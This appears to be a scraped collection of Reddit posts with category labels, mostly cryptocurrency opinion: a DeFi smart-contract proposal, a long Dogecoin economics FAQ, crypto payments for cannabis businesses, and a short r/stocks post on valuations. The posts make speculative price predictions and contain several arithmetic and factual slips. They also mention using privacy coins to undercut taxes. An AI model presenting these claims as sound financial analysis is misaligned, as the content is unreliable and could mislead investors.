I went on about the promise of DeFi a couple years forward. What are traditionally the margins (profits) of banks will become yours. Some already can be in a limited way for the savvy, but DeFi has way too much friction (this defined as the number of steps required to accomplish something). Consider the genesis of video streaming around 1996 (which is about where we are with Ethereum’s protocol). Think of the friction there. You needed:

 - to own a 56k modem
 - to download a tcp/icp client
 - to download a media player
 - to find the website
 - to add batch files

The more friction, the higher the learning curve. Fast-forward to today, and everyone carries a dozen video streaming options with them in their pocket, assuming there’s a smart phone there. Two-year-old children literally know how to use it. DeFi is unusable for the masses right now, this will equally change. 

Yeah my cheap dad. Now I wake up to text messages from him asking: “When is moon?”

Well, probably after Ethereum 2.0, and now that you’re oiled, I’d like to explain a concept to look forward to after the upgrades:

**—Private Charter (ENS-PCT)—**

Can you picture yourself a resurrection man covered in dirt working a shovel under the white glow of a single moonbeam? Barbaric I know. That was me once. I lost my login information, but luckily had etched my private keys on a metal card before burying it in a forest. Those days weren’t long ago. Neither were the days of writing shit on paper and stuffing it in a desk drawer. Or the best one I’ve come across which I called the *Victorian:* A fun friend of mine once kept his keys in a very expensive [highly secured] painting. They couldn’t be gotten to unless the painting was stolen, and scanned with special equipment. He had the painting insured for twice its appraisal value (two insurers aware of the double insurance, but not of the keys, who charged him triple premiums). Then bitcoin broke $10k and it wasn’t worth it. This *personage* persistently wore that little edge of a smile, hoping it would get jacked. He walked with an exotic wood cane and claimed to be related to Henry James the writer. This isn’t *Portrait of a Young Lady,* it’s crypto for chrissakes! Thankfully we’ve graduated to multisig wallets, and currently, social wallets, which Vitalik Buterin wrote a post on recently (link below). 

vitalik.ca/general/2021/01/11/recovery.html


I don’t believe any of that is even close to where we need to get. I propose the ENS-PCT (Ethereum Name Service Private Contract).

ENS-PCT is a smart contract you own. You are the dapp. Money has become like language. You can have as many as you like, but when set up, they are immutable. From it you can do everything a bank does and more: make loans, take loans, equity swaps, sending, spending, leveraging global interest rates (assuming central banks roll out their own stablecoins), help finance a war (kidding kind of), provide liquidity and stake. The latter two are important because ostensibly, they’ll allow you to never have to spend your crypto. If you want to spend, you borrow central bank stablecoins against your collateral. Because this collateral is staked or LP’d, those rewards offset the borrowed interest rate, probably by a percentage point or more (back to taking those bank margins we talked about earlier). This makes central banks compete in a way they never have before to attract borrowers to their stablecoin. So you can shop around. Also keep in mind your collateral is intrinsically deflationary (assuming it’s BTC, ETH or something of quality). The legacy financial apparatus (centralized finance) will serve decentralized finance. And they’ll have to do a damn good job of it, one that incentivizes people quite well. I believe they will. If they don’t, then the coming atomic swap abilities with privacy coins (I’m especially talking about XMR) will serve as an excellent check and balance that can wreck havoc on taxes among other things.  

The ENS-PCT has a vault and wallet. From the vault, you can recall all funds from your wallet into the vault. After pressing send to send any coins out of the vault, there’s a countdown unless the transaction is cancelled by email or other secure means. These outbound coins however, can only be sent to say four immutable predetermined addresses, each of escalating security: 

 - a different ENS-PCT vault you set up for yourself
 - an insured centralized exchange (like Coinbase vault)
 - the IRS (US Treasury) who will issue a refund

Any outbound transactions are accompanied by an attached note embedded with your immutable information and instructions. Again, nothing can ever be changed after initial setup. If you don’t login within a two year period (or however long you choose, or whatever conditions you choose) any borrowing is automatically settled, all funds recalled from the wallet, and all contents sent to the **fourth** predetermined addressee, which we assume is the ENS-PCT vault belonging to your wife, your children, a charity, or the US Treasury, because you’re dead or incapacitated. Again, detailed instructions embedded. 

Note: With immutable redundancies, private keys slowly start losing their importance

Also consider: The US Treasury should act as the probate, and I believe this is a controversial but elegant solution. 

All activity within the ENS-PCT wallet is protected with an NFT instead of a passcode or keys. You’ll have vowed this NFT to your empty vault before setting everything up in a process called ASM (art secured marriage). This will be used much like Apple’s finger ID or a decentralized identity where you can choose how much registration or personal info is attached. 

If you’ve gotten this far in this nonsense post of mine, I commend you. We’re almost finished.

For those talking about crypto cycles, and an eventual crypto winter, I have news for you: those ended when mass adoption got planted late last year. I can only speak of bitcoin and Ethereum (possibly stablecoins and privacy coins), but the global confidence curve of crypto is flattening dramatically. The liquidity here and every longterm metric point to a longterm collapse in volatility. It’s already happened to bitcoin. I believe the volatility [of bitcoin] will spike after $90k on the way to what is globally seen as a self-fulfilling prophecy of $100k. It likely stays in the $90k-$100k area for many many months as volatility continues edging off permanently. From there expect slow longterm appreciation, where the bank margin capture that we talked about above becomes the new form of speculation starting late 2022.

My prediction for Ethereum is a little different. It’s still the internet’s 1996 until 2.0, its major upgrades which I see in January next year. After, it will overtake bitcoin’s mkt capitalization and begin consuming everything digital, never fully, but think of digital mail (email) and the US Post Office dichotomy. 

People always ask me: “What price will you sell your ETH at?” It’s a silly question. Never. There’s no need to. I’m not a trader, I’m a DAO citizen. The pre-covid days of bitcoin and Ethereum are gone. The internet is no longer “[A] telecom scam sold to people too lazy to visit their local library,” as a professor once told me. And you’d be wise to consider that before any fiat interaction, unless you’re buying land/property or an education. 

Thank you for sharing my thoughts.",cryptocurrency
CryptoCurrency,"I'm fed up with the whole ""bull-run""/""bear-run"" Narrative. The same thing like in 2017/18 won't happen.","1. The price of any asset is not determined by fundamentals. Fundamentals are fucking worthless. It's always been supply and demand which regulate price. 

2. Bullruns are historically always longer. Bear. Markets are usually only for a few weeks at max. I'm talking about the stock market in the last few year's. 

3. Yes we are gonna see some volatility but that's all it is. Volatility.

So why is that? 

Cryptocurrencies are the future. We are gonna go full cashless in 10 years minimum. We have 8 billion people in the world and only extremely limited supply of cryptos atm(that aren't shit). People/institutions just STARTED investing real money in crypto.

Crypto is going to keep climbing until an equilibrium is reached and the price stabilizes just like with other currencies. It's way harder to move an asset by 40% worth 100trillion dollars then to move one only worth 1 billion. Until we reach those massive market caps we are gonna see volatility. 

Maybe my definition is off but I don't think a bear market is a -30% correction for 2-3 weeks after a year of a gain of 5000%.",cryptocurrency
CryptoCurrency,So what if the American weed industry started using crypto?,"Not sure what to flair this. Used politics because the whole reason this could be a thing is because banks aren’t allowed to service weed dispensaries.

So right now, weed dispensaries all have to be cash only businesses because banks won’t work with them. Cannabis is still illegal at the federal level despite being legal at most state levels at least medically. This makes it hard to run a weed business. Banks are not allowed to do business with the cannabis industry because it’s technically illegal, so the industry has to operate on a fully cash basis. It has to charge ATM fees for CC payments and has to pay its suppliers and bills in expensive money orders that have to be sent by snail mail. 

Enter crypto. Many coins are decentralized and can completely bypass traditional banks. This is wonderful for the American cannabis industry. They could take payments electronically in Bitcoin, Ethereum or a number of other coins. This would also lead to adoption of crypto by people who use cannabis in America, as well as business to business transactions. Instead of needing to buy and snail mail money orders to pay for shipments of supplies, cannabis suppliers could accept crypto electronically as payment for product. Employees could even be paid in crypto electronically instead of having to get paid as a money order or cash and needing to try to deposit it on a pay card or in a bank.

There are also exchanges that allow for loans of crypto, so the business could get a decentralized crypto loan, convert it to fiat, and use it to pay for business expenses like rent, payroll, and product. Businesses use loans all the time from banks, and many are consistently in debt, so this capability would be game changing for the cannabis industry that can’t do it at all and has to have cold hard cash for everything they do.

The Celo network would be amazing for this. It allows for payment in seconds anywhere in the world for minimal fees, and arrives to people as whatever fiat they need it in (USD in this case) through a decentralized network so they government can’t touch it. They could take payments from consumers on it, pay their suppliers, pay for freight, and so on. For bills that don’t take payment that way, they could pull USD out and pay that way.

Then they just use any of the crypto exchanges that do crypto loans for the loan side of it.

Could all of this even work? And what could mass adoption of crypto by the American cannabis industry do for crypto?",cryptocurrency
CryptoCurrency,Some friendly advice 2.0,"(edit: i posted this one month ago and the advice is still here with some modifications, but i couldnt care less for some moons or whatever)

Before reading this you need to have a few things in mind. U must not consider this as financial advice as im just an advanced monkey with some dire thoughts. You must also always dyor and keep in mind that the only one responsible for your own investments is you.

Binance and other exchanges are experiencing huge growth these days. Along with this the market keeps hitting all time highs. Nothing lasts forever, even this run of the bulls. Acknowledging that basically zero interest rates across the world is the key factor behind all of this is quite important. Not everyone sees the current hyperinflation, but its occuring every day in stonks, crypto, property etc. Others will notice as equity is allocated from these ever-increasing entities to regular commodities. 

-

If u have not prepared yourself in a proper and smart way it will hurt you among others. Now, having read this so far chances are youre one of those who understands why investing in crypto is essential to combat the challenges ahead. Far from everyone has prepared themselves and they will think that its like lightning coming from clear skies when its not. Large institutions understood this a year back and allocated their capital accordingly. Among these was tudor and lately its musk. To many of us they seemed to show up late to the party, but keep in mind that its better to arrive late then never arriving. In other words, we are no longer strange investors investing in strange projects. Other than that, everyone is making huge gains at this point and thinks theyre the king of the investment world. Not only is it stupid to think that way, but its kinda hard to avoid when the entire market has gone 10x and beyond. 

In a year the market of crypto has outperformed every other market. Still, the federal reserve keeps producing dollars that will find their way into the crypto sphere. 

Closely looking at the direction capital flows shows we still will be on this run for some time. Online banking is increasingly being replaced by defi. More and more are seeing this and trying it out. Irrational investors are piling up just for the fun of it. No matter what intentions newcomers have coming into this, their money still counts. Good luck to all of you in your endeavours to overcome the future inflation and spend your money wisely.",cryptocurrency
CryptoCurrency,It’s Crazy How Little This Community Actually Understands The Economics Behind Cryptocurrency,"This is not a shill or FOMO for Dogecoin. This is hard, proven mathematical, economical, and social theory fact on why Dogecoin is successful and will continue being successful. Buy Dogecoin or not - I don’t care

TL;DR is this this: read the full post or not, your loss. Make comments about how long it is, your loss. Dogecoin isn’t a shitcoin, never was never will be. Dogecoin has utility. It is a legitimate cryptocurrency whether you personally want to admit it or not.

I am going to explain each misconception regarding Dogecoin (which a lot of these also apply to cryptocurrency in general - again this is a pro-cryptocurrency post, not strictly a pro-Dogecoin only post). This is a re-write of another article I wrote tailored specifically for the Dogecoin community - since I know my audience; I removed some of the simpler topics. 

		
1. Question: What Is Dogecoin? And why Dogecoin?

Answer: Similar to other cryptocurrencies, Dogecoin, finds itself with the support of hundreds if not thousands of individuals pushing for this currency to succeed. But why is that? Unless you have been absent from every social bubble, you may have heard of Bitcoin. For the purpose of this explanation, you will find that Bitcoin is not exactly an easy thing to equate to Dogecoin, but lets think about the criteria of a Cryptocurrency. For those of you who have been around for a while - you know very well that Bitcoin did not find its foothold overnight. In fact, it took several years. A lot of people fought tooth and nail for their belief in the coin. Crypto, in a nutshell, is a decentralized form of currency that finds its value in a combination of individual asset involvement, ease or difficulty in security of an exchange, creating a method of reliable, secure, trustworthy exchange, and other reasons. 

Initially as a purely meme-driven alternative to the likes of Bitcoin and Litecoin, Dogecoin in-fact boasts very low transaction fees and fast transaction times, very little network congestion, and most importantly, is designed to be used as a daily means of exchange, like your morning cup of coffee. Also, it is really fun, and who doesn't like the Dog ?!

Think of it like this: to exchange goods and services without currency, one must barter. I can barter a service (a haircut, for example) towards someone who needs a haircut, and in exchange they can barter a good or service to me. Currency then becomes an ""IOU"" (I Owe yoU) so that, if somebody needs me to cut their hair, they can give me an IOU for a good or service they control. When enough people begin adopting this, a centralized currency eventually takes hold. Crypto seeks to take this a step further and, instead of relying on building up a centalization in terms of valuable metals or debt, it is built up solely on the exchange of goods and services. Dogecoin, compared to other cryptocurrencies, finds itself in a strange position where the origins did NOT see it soaring to the moon in any situation. Funny how things can change in time. Dogecoin has pros and cons to it. Comparing it to other cryptos, it does not face a supply cap like Bitcoin does. It is not a directly equated asset, such as how Bitcoin can be attributed as a digital gold asset. Mining dogecoin is also much simpler (comparitively) and does not face difficulty spikes, a source of Bitcoin slow-down.

2. Question: Is Dogecoin just a meme or should it be taken seriously? 

Answer: We have all witnessed the power of a meme, the depths it can reach in society, especially in recent years. We have seen it many times before with video games, consoles, Oreos, or as of late even toilet paper... A meme has inherent value in the form of “widespread information”. A meme can spread an idea across diverse communities, and even entire countries literally overnight. This can bring about lasting effects on culture and society. If correctly taken advantage of, Doge can become the dominant meme currency of the internet, and amass real-world value just by being a popular, recognisable meme itself. This is where the saying “Dogecoin is the people’s coin” comes from. This is marketing 101. If your idea, or product is too complicated or not enough people know about then it doesn’t matter how technologically sound it is. Dogecoin have the best technology? No. Can it be improved upon. Definitely. In fact, the original developers have started working on the project again. An analogy I like to use is this. McDonald’s makes hamburgers. They have a clown as a mascot. A literal personification of a joke. Does make McDonald’s make the best hamburgers? No. Does McDonald’s have “value” in their industry? Undeniably so. So what does McDonald’s do correctly? They provide a cheap, easily accessible, and brand able product to the masses. Which is what dogecoin does for cryptocurrency. 

3. Question: Does Dogecoin have value or it just a s—-coin. How does Dogecoin and other cryptocurrency increase in price or decrease in price? 

Answer: Yes. Dogecoin has value. If didn’t have value then it wouldn’t be bought or sold at all. Anything can have value as long as enough people assign it value and agree to it. The value of any means of exchange is fundamentally driven by supply and demand. If two parties agree that X amount of asset A is roughly worth the same as Y amount of asset B, you effectively have established a market.  That’s why the US dollar and other fiat currency has value even though it just a piece of paper. The difference between fiat currency and cryptocurrency is that fiat currency is determined by centralized government and other underlying economical/market conditions. Cryptocurrency is meant to be a decentralized form of fiat currency. Now as to why the price changes from say .05 to .06 (random numbers using this as an example for explanation purposes. It is not exact) this value is driven primarily by supply and demand. We already know the supply of Dogecoin(will be covered later) so for the purpose of this the main driving factor in the change in price is demand. But the demand for Dogecoin isn’t just one person. It’s the entire group of people who own Dogecoin. So if at any given time lets say 10 people with 1000 Dogecoin want to sell. But only 5 people want to buy 1000 Dogecoin. This means that the sellers “value” Dogecoin less at its current price than buyers do. 5000 Dogecoin less. This changes to price from .05 to .49. The same applies if more people wanted to buy. Then the price would go from .05 to .051. An algorithm repeats the process over and over constantly updating the price. However that’s only one way to change the value. The best way to increase the overall value of cryptocurrency in the long run is by giving it utility.Which basically means that it can be used for something other than just buying at .05 and selling it .06. That is why you see people pushing to accept Dogecoin as payment. It further legitimatizes Dogecoin as a cryptocurrency and currency in general when companies allow you to exchange it for goods and services. Another explain not related to Dogecoin is NFTs. The concept of supply and demand as well as utility applies to all cryptocurrency. 

4. Question: Circulation of currencies. The importance of buying, selling, and holding - and the differences between them. 
		
Answer: To briefly explain this, a lot of people have been saying “buy and hold” or “I’m never selling!” - which in itself is great start. But there remains a lot of misinformation around the topic, for example that simply ""buying and holding "" will drive up the price indefinitely. Unfortunately, that is just not true. Buying, holding, and selling are all intricately connected with each other. ALL of those three states are essential for a (digital) currency to flourish. Holding does neither hurt or raise the value of the asset, but rather it helps to establish a baseline, which is also called ""setting a floor"". Those who have diligently kept on holding their coins, have allowed Dogecoin to stabilize at its current price point. Remember, this remains a huge gain from where Dogecoin has been just months ago. An active circulation of a currency is critical to establishing it as an effective means of exchanging goods and setting it up for long term growth.

5. Question: Mining Dogecoin. How new Dogecoin are created and enter the market/supply. It there an infinite supply of Dogecoin being produced? Comparison to Bitcoin and the US dollar. 

Answer:
mining is the process of creating new cryptocurrency by solving a computational puzzle. mining is necessary to maintain the ledger of transactions upon which cryptocurrency is based. Miners have become very sophisticated over the last several years using complex machinery to speed up mining operations. Approximately 600,000 dogecoins are produced per hour and 5,256,000,000 (5.26 billion) per year and there are currently approximately 128,000,000,000 (128 billion) Dogecoin. Now let’s compare this information to what we know about Bitcoin. Bitcoin currently has a supply of 18.5 million. Currently 900 Bitcoin are mined per day or 328,500 per year. However, unlike Dogecoin, Bitcoins mining rate is not fixed. Bitcoin has something known as a Bitcoin halving which means at some point in the future instead of 900 per day being mined 450 are mined. Now let’s compare Dogecoin and Bitcoin to the US Dollar. The US Dollar has an estimated paper money supply (more on this covered in a later section) of approximately (1.2 to 2 trillion) and in 2019 the federal reserve printed 188.3 billion paper dollars. This means that there is 10 times more supply of dollars to Dogecoin and the government prints 37 times more dollars than Dogecoin is mined per year. It is also important to note that this increase in supply of Dogecoin is fixed. It never changes. The federal reserve can change how much they print any given year. Many people think that this means that the supply of Dogecoin is infinite or infinitely increasing. That is not true in the span of our life time. It will take approximately 24 years for the supply of Dogecoin to double and it will take 360 years for the supply of Dogecoin to reach the current supply of the US Dollar. That’s without taking into account the fact that federal reserve adds more dollars each year than Dogecoin adds to its supply each year. Technically speaking the supply of Dogecoin will eventually reach infinity if given enough time but you have to remember that infinity isn’t an actual number. You can’t mine “infinite” dogecoin because infinity isn’t a number. It’s a mathematical concept to describe something that is boundless. Dogecoin doesn’t have a boundless increase. It has a fixed increase a set amount added at a specific interval. So in practical terms for the purpose of using Dogecoin as a legitimate cryptocurrency, this infinite argument against Dogecoin doesn’t matter. In fact it’s actually way better than Bitcoin at exchanging goods and services because of this fact. That is why the price per Bitcoin is in the in the 50,000 dollar range per coin and the price per Dogecoin is in the .05 range. with a realistic possibility of only reaching $288.60 at current market conditions (this will be covered later). That is why it costs .00012 Bitcoin for milk but only 50 Dogecoin for that same commonly traded commodity. That’s why Bitcoin will be treated like digital gold. That is why Dogecoin can be used like a dollar - cheap, spendable and easily replaced. The price per coin are inherently different because their supplies are different.

7. Question: Should Dogecoin have a cap on its supply. What does having a cap mean, why do some cryptocurrency have a cap and other don’t? How does it affect the price? Will adding a cap increase the price per Dogecoin. Comparing bitcoin (capped) Dogecoin (no hard cap) 


Answer: - 
When people say they want a supply cap - what they are saying is that they want to place a limit on the total possible supply of Dogecoin. They point to bitcoin as having a cap, and since bitcoin has a cap, that must be why it is valued so high. Through scarcity. That is partially true, but it’s not because of the cap. The scarcity doesn’t come from having a cap, it comes from having a low supply and mining amount which reduces over time. Known as a bitcoin halving. 

Bitcoin and Dogecoin are two completely different cryptocurrency. Their supplies are different. Their utility is different. Having a cap does nothing in terms of the actual value of Dogecoin or bitcoin at the current moment. The cap only matters once that limit has been reached. The cap for bitcoin doesn’t happen until 2140. The price of bitcoin is due to the limited supply (18 million) relative to the global population, the bitcoin mining rate and bitcoin halving. All things that Dogecoin does differently. That doesn’t mean Dogecoin doesn’t have value. It doesn’t mean Dogecoin is infinite. It just means that they’re different. Dogecoin has a current supply of 128 billion, which is why the price is lower and harder to change in value. It is easier for bitcoin to rise $1 in price because the supply of bitcoin is so low and the supply of Dogecoin is so high. It doesn’t mean that Dogecoin can’t rise in price - just that it’s harder. 

Adding a cap won’t automatically increase the price because the cap isn’t the problem. You can’t reduce the 128 billion supply (unless you burn them or lose them). They already exist. People get confused because they don’t understand inflation and continual growth and why they are necessary for Dogecoin to a successful cryptocurrency based on the core parameters made when Dogecoin was created. They also don’t understand infinity. Dogecoin is not infinite. It can never reach infinity because infinity isn’t a number. As long as Dogecoin exists and is being mined it is not infinite. 

To further this point the original developers of Dogecoin have already stated that they will NOT be adding a cap. Adding a cap fundamentally changes Dogecoin at its core level and they’re just not going to do it. Here is the direct answer from the Dogecoin developers: “A, block reward is needed to secure Dogecoin network in a decentralized manner. Dogecoin is merge-mined with Litecoin, and that makes it somewhat secure against PoW attacks. But if Dogecoin reward will be too low, some Litecoin miners may drop Dogecoin, and our security will suffer. From this point of view, bigger reward is better. If you propose reducing the reward over time, you must also propose a solid way to keep Dogecoin secure. Now about the economic aspect. Current Dogecoin issue rate, taken relative to current total amount, is low, it's almost nothing compared to all the other factors that affect Dogecoin value. If you look at Dogecoin price chart since the introduction of current issue schedule, you will not see effects of ""inflation"" for all the wild price changes caused by other factors. And this already low issue rate gets even smaller over time, compared to total amount of dogecoins. The only real reason for these ""cap"" proposals is trying to ""sell"" Dogecoin to investors under the premise of possibly increased scarcity in the future. In my opinion, we don't need to try to appeal to investors. Dogecoin value will be increasing because of strong community and increased usage. And the fact that Dogecoin value increases is already enough for investors to jump in and increase it even more.”
You can read the full response to this directly from the developers here on their GitHub 

Even if they DID add a cap it would actually be LESS beneficial for Dogecoin as a currency. 

Here’s some Basic economics explaining why. Inflation and deflation are common economic terms used to explain the change in the inherent value of a currency. This means that that 1 US Dollar today does not have the same value or “worth” as it did, for example, in 1950. Inflation is a situation of rising prices in the economy. A more exact definition of inflation is a sustained increase in the general price level in an economy. Deflation on the other hand occurs when the inflation rate falls below 0%, that is a negative inflation rate. While inflation reduces the value of a currency over time, a sudden deflation of a currency increases its relative value. This would allow more goods and services to be bought than before with the same amount of currency. Deflation can be a factor in leading to a recession and also result in a deflationary spiral.

Common follow up question:
What does all this mean with regards to cryptocurrency, specifically Bitcoin versus Dogecoin?

Well - Bitcoin is stagnant or deflationary over time, while Dogecoin is inflationary overtime. This is due to the way they are architected and mined, and how new coins are added into their respective markets What gets misunderstood is which one is “better” or rather ""the lesser evil"". Dogecoin doesn't need a supply limit like Bitcoin, because in the long run it will be much easier to exchange Dogecoin for goods and services, than with other crypto currencies or regular currencies for that matter. Bitcoin will continue to skyrocket in price because less and less are being mined. Bitcoin is like gold. Dogecoin is like the dollar. Bitcoin and Dogecoin have their pros and cons. Our current money is backed by signatures on debt contracts, not on real values. But it works, because we believe in it, even if it will be our downfall if it continues like this. People get confused because they think inflation is a bad thing, when in fact it is actually beneficial in small quantities and beneficial to the longevity of a currency.

Currencies have inflation - commodities don’t. Dogecoin is better suited to be a currency than Bitcoin is. Bitcoin is better suited to be a digital version of gold. That doesn’t mean one is better than the other - just that they are different. 

8. Question: Is a Dogecoin increase to the equivalent of one US dollar possible? Could and will it potentially happen? What would change if it does happen? How high could Dogecoin realistically rise in price? comparison to US currency and global FIAT currency. - Explaining Market Cap, what it is, what it means, and how it’s used. 

Answer: Despite not having a fixed or capped supply, yes, the value of dogecoin can rise based on its relative value against other currencies in the market in the future. You can find examples of this in the FOREX market where currency pairs are traded, like Euro against US dollar, or US Dollar against Japanese Yen. As the value of Dogecoin rises, more and more businesses will recognise its potential and importance, and subsequently begin to accept it in exchange for goods and services. This will also help to grow the developer community around Dogecoin.

Mathematically speaking market cap = price multiplied by supply
MC (Market Cap) = P (Current Price) x S (Current Supply)

Market cap just means how much the total supply is “valued/worth” at a certain price. The exact definition applies to stocks; not cryptocurrency how ever for our purposes the mathematics still apply.

I see people saying how insert x cryptocurrency has a current market cap of $y billion dollars then they find out what the market cap needs to be and say if this many people put this much money into the system then the price will rise to that value. The most common example is that for Dogecoin to be $1 it would have  $128 billion market cap. People then say if 100 million people put $1000 in doge then doge will = $1.

Super simple right? The only problem is: THAT’S NOT HOW MARKET CAP WORKS.

Simply adding money to the system does absolutely nothing to affect market cap. The only two variables that change the market cap are price. And supply nothing else can change the market cap.

Market caps REAL use is a comparison tool. It’s used to compare how successful a market is compared to other markets. I will provide an example below. 

The current market cap of Dogecoin while writing this article is $6,077,915,837 ($6 billion). If Dogecoin were to reach $1 today it would have a market cap of about 128 billion dollars ($1 x 128,495,957,919 circulating supply). Bitcoin (the most successful cryptocurrency) currently has a market cap of approximately $898,761,019,333 (~ $900 billion). This means that at $1, the total supply of Dogecoin would be “worth” about 1/7th of Bitcoins total supply. The estimated supply of the US dollar is about $2,000,000,000 (2 trillion), thus the market cap of the US currency is $2 trillion. If Dogecoin were to reach the equivalent market cap ($2tn / $128bn), the price per Dogecoin would have to be $15.60, thus matching the entire short-term US currency (M0 money supply in economics).

This is definitely not impossible, but it is highly highly improbable to reach such value any time soon. If that were to ever happen, it would take years. Now, the entire supply of the entire worlds fiat (short-term liquidity / paper) currency is $37 trillion. You can apply the same logic from above and see that the value of Dogecoin would have to be $288.60. If it was valued any higher than that amount, Dogecoin would be ""worth"" more than the entire world’s short-term liquidity currencies combined. Keep in mind - It could technically mathematically speaking go past this point, but what that would mean is that the economy behind Dogecoin would be stronger than the entire global economy of today. It’s not impossible- but is is highly unrealistic to pass that point. 

You can use this same comparison tool and apply it to any cryptocurrency of choice to find “realistic” values of the price per coin. It’s just important to remember that MARKET CAP DOES NOT MEAN TOTAL AMOUNT OF MONEY IN THE SYSTEM - A 6 billion dollar market cap does not mean there’s 6 billion dollars in the system. It means that the entire supply is “worth” 6 billion at the current price. When I originally wrote this people got confused so I wanted to clarify that.

9. Question: Pump and dump vs long term growth and the difference between them. Is Dogecoin just a pump and dump meme coin.

- so I want to side bar here really quick. Dogecoin is not simply a pump and dump. The graphs speak for themselves. Pump and dumps don’t last months. Being part of the cryptocurrency community I’m sure you all have experienced REAL pump and dumps and this argument can finally be put to rest. However, I still want to provide an answer to this misconception because I still still it lingering around. 

Answer: ""Pump and dump"" is a form of securities fraud that involves artificially inflating the price of an owned stock through false and misleading positive statements, in order to sell the cheaply purchased stock at a higher price. Pump and dumps are illegal. While a subset of people were trying to pump and dump Dogecoin, the legitimate community is focused its long term growth and stability which is achieved through the rest of the topics addressed here

Sustainable Growth is how cryptocurrency flourish. The trends over the past few months show that the true Dogecoin supporters are focused on sustainable growth - not pump and dump or short term gain.


10. Question: Elon Musk - Is he important for Dogecoin? The impact of celebrities and big business supporting Dogecoin Celebrity/Influencer Involvement

Answer: Elon Musk, Mark Cuban
As many may know, Elon is highly involved when it comes to “meme culture.” we can see Elon has tweeted several times concerning “doge,” reposting memes found from Reddit, as well as concerning himself with the ripples of the recent stock news. Mark Cuban, another notable wealthy, down-to-earth, community-involved individual, has recently mentioned “#dogecoin” specifically and actually began allowing his NBA basketball team to accept Dogecoin for payment. Regardless of whether these people have positive intentions towards $DOGE or not, their mention carries weight and public opinion and is a good assumption that new eyes are looking at us as a result. It should be noted that they have tweeted neutrally to positively towards $DOGE, not indicating a full-send support but they clearly are not talking down the possibilities.

Big business allowing Dogecoin to be supported as means of exchanging goods, and people like Elon musk supporting and backing this cryptocurrency are important to proving its value and legitimacy. 

However, it is important to remember that this is not the sole determining factor in the price. The price is determined through supply and demand and utility. Elon musk and other major high profile individuals doesn’t control that, but they do help 

11. Question: What is a 51% attack? Can it realistically happen? What are the implications if it were to happen?

Answer: A 51% attack refers to an attack on a blockchain most commonly bitcoin. Such an attack is possible but still just hypothetical. It requires group of miners to control more than 50% of the network's mining hash rate or computing power.

The attackers would be able to prevent new transactions from gaining confirmations, allowing them to halt payments between some or all users. They would also be able to reverse transactions that were completed while they were in control of the network, meaning they could double-spend coin. 

They would almost certainly not be able to create new coins or alter old blocks. A 51% attack would probably not destroy bitcoin or another blockchain-based currency outright, even if it proved highly damaging.

You may have seen an article going around talking about the 51% attack and why it will cause Dogecoin to go to zero. Regarding the 51% Hashrate attacks, Yes, they are real, and have been ever since cryptocurrencies aka Bitcoin started. The article even mentions an example. Now, if a large group of people with a lot of resources very effectively coordinated, they could indeed make a 51% attack on Dogecoin happen. But not just on Dogecoin, but also on many other, small cryptocurrencies. This is nothing new, this has basically been known for the last 10+ years. But the author of the article needs clicks, so there goes the horror-scenario headline... Possible - yes, absolutely. Likely, not very. Unless you have a large sum of people with a few resources each coordinating perfectly - that is in my honest opinion very unlikely - you could have governments, very large hedge funds, or maybe Elon Musk build a vast array of mining farms and do said 51% Hashrate attack. But again, that effort would only be worthwhile if those groups had a definite interest in destroying Dogecoin. There are probably other cryptocurrencies that would be more interesting from that perspective, such as litecoin. Of course, despite the sensationalist headline, for them clicks, the author covers their own backside by stating the following:
""In conclusion...Pretty much all the crypto besides Bitcoin and Ethereum are at material risk of a 51% attack, and it's not just a theoretical risk."" This problem is not tied specifically to Dogecoin, but to every single cryptocurrency. Now let’s do some math to calculate exactly how much it would cost in order to succeed in pulling off a 51% attack on Dogecoin. Dogecoin has a hash rate of 299.17 TH/s or 299,170,000 MH/s. If you were to use an RTX3090 which costs $2,000 US Dollars, and has a hash rate of 121 MH/s. You would need 1,260,964 RTX3090 at a cost of $2,521,928,926 dollars ($2.5 billion). Is it possible? Yes. Is it likely? No. 

12.. Question: There is a lack of developer support for Dogecoin. The technology is outdated. Why would anyone come work as a Dogecoin developer when there are thousands of other cryptocurrencies? 

Answer: The short answer is there is already development being done due to recent weeks bringing Dogecoin back into relevancy. the original Dogecoin developers have already began working on the project with the new found support of the community and companies accepting Dogecoin as payment. Can the technology be improved? Yes. Is it being improved as we speak? Yes. 

13. Question: if all of the above information is true why are so many people trying to discredit Dogecoin as legitimate cryptocurrency? 

Answer: I already explained this through the answers above. Mainly because people are misinformed. No one person has all of the knowledge of all aspects of a cryptocurrency so when someone is attacking Dogecoin on why it won’t be successful is probably misinformed. Dogecoin is already successful. It’s been proven already. The question is HOW successful. Which nobody really knows the answer to. Others will try to discredit Dogecoin for the exact same reason they try to discredit cryptocurrency in general. it is novel and has gained popularity. Crypto Is a new(ish) technology and a lot of people don’t understand how it can be used. People also discredit it because it’s a “meme”. Which as established above has nothing to do with the usefulness of the cryptocurrency itself. 

14. Question: Will cryptocurrency replace fiat currency? Will a cryptocurrency be the next world currency? 

Answer:  (this is the visionary in me) 
Cryptocurrency is in its infancy. People don’t realize the worldwide paradigm that is taking place right in front of our eyes. People are starting to see that traditional fiat (paper) currency back by centralized governments and debt are flawed and can be improved upon. Cryptocurrency is the future whether the people who can’t see it or try to disagree believe it or not. It’s inevitable. I knew it was inevitable in 2013 when I first heard about Bitcoin. A cryptocurrency will replace fiat currency in the future. Will it be Bitcoin? ETH? Dogecoin? Ada? Some other cryptocurrency that doesn’t exist yet? I don’t know. Cryptocurrency is taking the financial sector by storm - odds are there’s going to be a few key cryptocurrency for each aspect. - ones replacing fiat, ones replacing precious metals, ones replacing the banking system through deFi. Honestly getting into cryptocurrency now is like supporting the internet in the 80s - nobody knows where it’s going to be in 30 years.",cryptocurrency

  I'm a Mechanical Engineering student at one of the best public federal universities in the country, there's a whole gigantic test to get into it and stuff and usually companies like hiring people who studied where i do today, i work as a intern (which is a bit different from the US intern, we do basically actual engineer work and have a 2 yr long contract) and i receive like 169% of a minimum salary.

stocks,To those who say low interest rates justify higher valuations...,"To those who say low interest rates justify higher valuations...

... you must also acknowledge that higher current valuations imply lower future returns. Assuming no change in expected future cash flows, which is implied by only citing lower rates as justification for current valuations, you are essentially “pulling forward” returns with a higher PV of cash flows (low discount rate). Equity returns boil down to the discount rate being applied to cash flows over time and the delta between expected cash flows and actual cash flows. Therefore, if cash flows are delivered as expected, equity returns will equate to the discount rate that was applied to those cash flows. Of course, if you have a view that future cash flows will outperform expectations, then there is an opportunity to earn above the implied discount rate.

Now, I am not making a case for the market being over/undervalued. I have just heard too many market “experts” use the low interest rate argument for why it’s a good time to be in equities without acknowledging the other side of the coin.",finance

